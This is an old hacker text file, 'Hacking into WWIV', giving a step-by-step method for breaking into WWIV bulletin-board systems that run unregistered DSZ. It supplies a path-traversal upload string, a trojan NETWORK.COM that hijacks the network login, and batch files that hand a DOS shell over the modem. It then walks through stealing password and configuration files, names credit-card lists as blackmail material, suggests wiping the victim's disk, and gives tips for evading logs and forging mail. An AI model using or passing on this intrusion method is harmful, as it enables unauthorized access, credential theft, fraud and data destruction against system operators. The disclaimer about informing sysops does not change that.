<h2>Hacking into WWIV</h2>
<h4>by Redwoods of Group 42</h4>
</center>

         WWIV, when unmodified and when not using external
    chains/protocols/programs, is essentially impregnable.  However, good
    ol' Wayne Bell has also distributed the source code, external network
    programs, protocol support, and other nifty benefits that have made
    life for a WWIV hack much easier.  This textfile will describe the
    essentials of hacking into WWIV via a hole in unregis The key here is
    >unregistered<, since this hack works through DSZ's refusal to
    reroute Zmodem-batch downloads without registration.
<p>

<h4>Step One:</h4>

         Call your local WWIV board under a false alias.  They are
    usually struggling and haven't had the time to 'register' DSZ.
    This will only work if they haven't registered DSZ!
<p>

<h4>Step Two:</h4>


         One you have an account go straight to the transfer section.
    Upload (to the SysOp).  When prompted for the file name, enter
    "..\..\??.???".  You'll see the Zmodem receive string.  Upload the
    included file NETWORK.COM.  The BBS will say, "transfer aborted"...
    but you know better!  Hang Up.
<p>

<h4>Step Three:</h4>


         Call back very shortly afterwards (thirty seconds approx.).
    When you get the "NN:" prompt, enter "!-@NETWORK@-!" (again, no
    quotes).  This will access the unpassworded WWIVnet account (the
    password routines are external).  When the BBS sees this, it will
    drop to DOS and run NETWORK.EXE.  However, since COMs are run before
    EXEs, your NETWORK.COM will be executed!  NETWORK.COM then created
    two batch files: HACK.BAT and DLZ.BAT.  They are as follows:
<p>
<pre>
               HACK.BAT


         DEL NETWORK.COM
         CTTY COM1
         COMMAND


                DLZ.BAT


         CLS
         CTTY CON
         DSZ port1 speed2400 sz %1
         CTTY COM1
         CLS
</pre>

         After NETWORK.COM has created these two files, it will run
    HACK.BAT which will turn control over to COM 1 and shell to dos!
    Now that you are in DOS, there are a few things that you must
    immediately do.
<p>
<h4>Step Four:</h4>


         Use DLZ.BAT to leech the target's CONFIG.DAT from his main BBS
    directory (the one you were dumped in when you arrived).  The format
    is:
<p>
<pre>

        DLZ <filename>


    where <filename> is the name of the file.  For example, 


        DLZ CONFIG.DAT


    will leech the configuration file.
</pre>

<h4>Step Five:</h4>


         Go to his BBS DATA directory.  This is usually C:\WWIV\DATA, but
    you might have to look around a little bit.  When you find it, use
    DLZ to leech the target's USER.LST.  Using Norton Utilities or any hex
    and/or text editor, it is very easy to see where the usernames and
    their passwords are stored.
<p>

<h4>Step Six:</h4>


         If the target is in WWIVnet or WWIVlink, download his/her
    CALLOUT.NET file from the aforementioned data directory.  This will be
    explained later.
<p>

<h4>Step Seven:</h4>


    Delete HACK.BAT if you haven't already!
<p>

<h4>Step Eight:</h4>


         Look around.  Leech anything that looks interesting.  This
    includes:
<P>
</pre>

                / Private G-Files from the G-File section
    Good for --< Lists of credit-card or calling-card numbers
    blackmail   \ Pirate files


              --> His dialing directories from Telemate or Telix; these
                  usually contain passwords and numbers of private BBS's!
</pre>

<h4>Step Nine:</h4>


         Hang up.  If you really hate him, upload Norton's WIPEDISK.EXE
    along with the rest of the files, run it, and permanently destroy
    all data on his drive.  This is generally not recommended, because
    so far he has NO WAY of knowing you were in unless he watched.
<p>

<h4><i>Tips:</i></h4>


    a) In the target's logs, nothing will show except that you hit 'U'
       when you were online and quit before the upload started.  This is
       virtually always overlooked, and logs more than two days old are
       usually deleted.
<p>

    b) In the target's net logs, he'll probably see a >NO NET<, which is
       rather common.
<p>

    c) Very close to the beginning of CONFIG.DAT and right before the
       first directory entry (usually "MSGS\") you will find the target's
       SYSTEM PASSWORD.  This is needed if you are going to log on as
       him or a remote sysop.
<p>

    d) If a sysop logs on, it is not noted in the LAST FEW CALLERS screen
       OR the logs.
<p>

    e) A few commands that you will want to try out when you are online as
       #1 are:
 <p>
 <pre>
                //DOS
                //UEDIT
                //BOARDEDIT
                //DIREDIT
                //GFILEEDIT
                //CHUSER
 </pre>

       Most require the system password, but if you're online as the
       sysop you already have that.
 <p>

    f) You can have great fun with planted and rouge mailing if you have
       a copy of WWIV and the victim's CALLOUT.NET.  CALLOUT.NET has a
       little note after every entry that looks something like:
 <p>

                           "KAOIYQIGNADFUKG"
  <p>

       Or another random password.  Read WWIVTECH.DOC (available on most
       WWIV boards) for more information.  You should be able to pick
       up/drop off mail supposedly from and to your target very easily
       for about a week.  When you start getting >BAD PASSWORD<, get
       back into your victim's DOS and get the passwords again!
  <p>

    g) You should be able to figure out what to do with the password file.

  <p>

    h) NEVER, NEVER, NEVER press backspace when there is nothing to
       backspace!  This will have catastophic effects and will definintely
       crash CTTY!
   <p>

    i) This file is provided to inform WWIV sysops of this threat.  If
       somebody uses it for "bad" purposes, it is not my fault.
    <p>

<h4>COM Ports</h4>


         As you may have noticed the batch files that NETWORK.COM
    creates (HACK.BAT and DLZ.BAT) are created to be run on a bbs with
    it's modem as COM 1.  Due to the fact that all bbs's don't use COM
    1 I have included the pascal source for NETWORK.COM so it may be
    edited as to turn control over to COM 2, 3, or 4.  Due to the Fact
    that this entire text file has been in pascal commenting you can
    use this text file as the source to compile a modified NETOWRK.COM
    file.
